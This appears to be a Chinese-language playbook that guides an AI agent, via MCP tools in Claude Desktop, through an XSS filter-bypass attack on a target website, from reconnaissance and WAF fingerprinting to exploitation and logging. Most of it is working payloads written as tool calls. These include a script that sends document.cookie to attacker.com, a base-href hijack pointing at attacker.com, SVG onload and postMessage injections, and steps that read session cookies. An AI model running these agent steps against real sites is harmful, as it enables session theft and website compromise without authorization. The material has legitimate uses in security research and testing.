# XSS Filter Bypass — MCP 攻防流程

> 关联技能: `web-xss-001`
> 所需 MCP: Sequential Thinking, HTTP Fetch, Playwright, Memory, Filesystem

---

## 阶段 1: 侦察 (Sequential Thinking + HTTP)

**Sequential Thinking MCP 拆解:**
```
Step 1: 目标页面是否存在用户输入反射点？
Step 2: 反射上下文是什么？(HTML body / 属性值 / JS 字符串 / URL)
Step 3: 是否存在 WAF / CSP？具体规则是什么？
```

**HTTP Fetch MCP 执行:**
```json
{
  "method": "GET", 
  "url": "https://target.com/search?q=test123",
  "headers": { "User-Agent": "Mozilla/5.0" }
}
```

**Response 分析:**
- 查找 `test123` 在响应中的位置 → 确定反射上下文
- 检查 `Content-Security-Policy` header 内容
- 检查响应头中 `X-Frame-Options`, `X-XSS-Protection`

---

## 阶段 2: WAF 指纹识别 (HTTP + Sequential Thinking)

**HTTP Fetch MCP 执行探测序列:**

```json
[
  {"method": "GET", "url": "https://target.com/search?q=<script>alert(1)</script>"},
  {"method": "GET", "url": "https://target.com/search?q=<img src=x onerror=alert(1)>"},
  {"method": "GET", "url": "https://target.com/search?q=';alert(1)//"}
]
```

**WAF 指纹判定:**
- 403 + `blocked by` → Cloudflare / ModSecurity
- 200 但内容被过滤 → 应用层过滤器
- 200 + payload 原样返回 → 无 WAF，直接注入

**Sequential Thinking 决策:**
```
If WAF detected:
  → 选择对应的绕过策略集 (web-xss-001 knowledge)
Else:
  → 直接注入
```

---

## 阶段 3: 攻击执行 (HTTP + Playwright)

### 场景 A: 无 WAF / CSP 宽松

**HTTP Fetch MCP:**
```json
{
  "method": "GET",
  "url": "https://target.com/search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
}
```

### 场景 B: CSP 限制 (base-uri 绕过)

**Playwright MCP:**
```json
{
  "action": "navigate",
  "url": "https://target.com/search?q=<base href='https://attacker.com/'><script src=js/app.js></script>"
}
```

### 场景 C: WAF 拦截 `<script>` (SVG onload 绕过)

**Playwright MCP:**
```json
{
  "action": "navigate",
  "url": "https://target.com/search?q=<svg onload=alert(document.domain)>"
}
```

### 场景 D: DOM XSS (postMessage)

**Playwright MCP:**
```json
{
  "action": "navigate",
  "url": "https://target.com/page-with-message-listener"
}
```

**然后在页面内执行:**
```json
{
  "action": "evaluate",
  "script": "window.postMessage('<img src=x onerror=alert(1)>', '*')"
}
```

---

## 阶段 4: 验证 (Playwright + HTTP)

**Playwright MCP 验证:**
```json
[
  {"action": "screenshot", "path": "./results/xss-test-1.png"},
  {"action": "evaluate", "script": "document.cookie"},
  {"action": "getContent", "selector": "body"}
]
```

**验证指标 (来自 web-xss-001 SKILL.md):**
- alert/confirm/prompt 是否弹窗
- 攻击者服务器是否收到外带数据
- 控制台是否有 CSP 违规错误

---

## 阶段 5: 记录 (Memory + Filesystem)

**Memory MCP:**
```json
{
  "action": "add",
  "entity": "target.com",
  "attribute": "waf_type",
  "value": "ModSecurity (detected by blocking <script>)"
}
```

**Memory MCP 记录绕过模式:**
```json
{
  "action": "add",
  "entity": "target.com",
  "attribute": "bypass_technique",
  "value": "SVG onload (bypasses <script> filter)"
}
```

**Filesystem MCP 保存结果:**
```json
{
  "action": "write",
  "path": "./results/xss-test-report.md",
  "content": "# XSS Test Report: target.com\n..."
}
```

---

## 完整执行命令 (Claude Desktop)

在 Claude Desktop 中，先加载技能知识，然后依次执行：

```
/load skill web-xss-001

→ Sequential Thinking: 分析目标并规划攻击步骤
→ HTTP Fetch: 发送探测 payload
→ Playwright: 浏览器验证
→ Memory: 记录结果
```

该流程对应 `skills/web-xss-001/SKILL.md` 中的操作检查清单第 1-9 步，
将技能知识转化为实际的 MCP 工具调用。
